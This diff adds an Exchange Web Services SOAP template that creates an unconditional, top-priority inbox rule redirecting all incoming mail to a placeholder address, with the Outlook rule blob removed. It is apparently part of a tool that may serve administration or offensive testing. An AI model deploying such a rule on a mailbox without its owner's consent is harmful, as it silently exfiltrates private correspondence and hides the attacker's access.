@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Header>
+	<t:RequestServerVersion Version ="REPLACE_EXCHANGE_VERSION"/>
+</soap:Header>
+<soap:Body>
+		<m:UpdateInboxRules>
+			<m:RemoveOutlookRuleBlob>true</m:RemoveOutlookRuleBlob>
+			<m:Operations>
+				<t:CreateRuleOperation>
+					<t:Rule>
+						<t:DisplayName>REPLACE_DISPLAY_NAME</t:DisplayName>
+						<t:Priority>1</t:Priority>
+						<t:IsEnabled>true</t:IsEnabled>
+						<t:Exceptions />
+						<t:Actions>
+							<t:RedirectToRecipients>
+								<t:Address>
+									<t:EmailAddress>REPLACE_TARGET_EMAIL</t:EmailAddress>
+								</t:Address>
+							</t:RedirectToRecipients>
+						</t:Actions>
+					</t:Rule>
+				</t:CreateRuleOperation>
+			</m:Operations>
+		</m:UpdateInboxRules>
+</soap:Body>
+</soap:Envelope>
